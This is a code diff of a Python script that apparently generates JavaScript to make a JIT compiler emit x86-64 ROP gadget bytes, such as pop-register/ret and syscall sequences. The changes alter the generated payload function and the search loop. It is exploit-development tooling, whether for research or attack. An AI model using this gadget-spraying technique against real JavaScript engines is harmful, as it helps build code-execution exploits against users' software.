@@ -7,6 +7,7 @@ import time
 
 
 gadgets = ['58c3', '5fc3', '5ac3', '5ec3', '0f05']
+# gadgets = ['5ec3']
 exec_path = ''
 
 def excute_js(js:str)->bool:
@@ -35,13 +36,7 @@ def generate_js(count:int):
 array = new Uint8Array();
 const constant = 0x1234;
 function payload3(v1, v2) {
-	array[10] = v1 + 0x11;
-	array[11] = v1 + 0x22;
-	array[12] = v1 + 0x33;
-	array[13] = v1 + 0x44;
-	array[14] = v1 + 0x55;
-	array[15] = v1 + 0x66;
-	array[1];
+    array[0] = v1 ^ 0x11;
 	if (v1 > 0){
 		array[1] = 0x00;
 '''
@@ -69,7 +64,7 @@ function payload3(v1, v2) {
 	array[19] = v1 * 0x12;
 	array[20] = v1 * 0x23;
 	array[21] = v1 * 0x34;
-	return array[1] ^ array[2] ^ array[10] ^ array[11] ^ array[12] ^ array[13] ^ array[14] ^ array[15] ^ array[16] ^ array[17] ^ array[18] ^ array[19] ^ array[20] ^ array[21];
+	return array[0] ^ array[1] ^  array[15] ^ array[16] ^ array[17] ^ array[18] ^ array[19] ^ array[20] ^ array[21];
 }
 
 
@@ -94,10 +89,12 @@ if __name__ == "__main__":
     # for i in range(24):
     #     generate_js(i)
     # print('done')
-    for i in range(0, 10000):
+    for i in range(2100, 10000):
         print(i)
         js = generate_js(i)
         excute_js(js)
+        if len(gadgets) == 0:
+            break
     # time.sleep(1)
     # print(js)
     # excute_js(js)
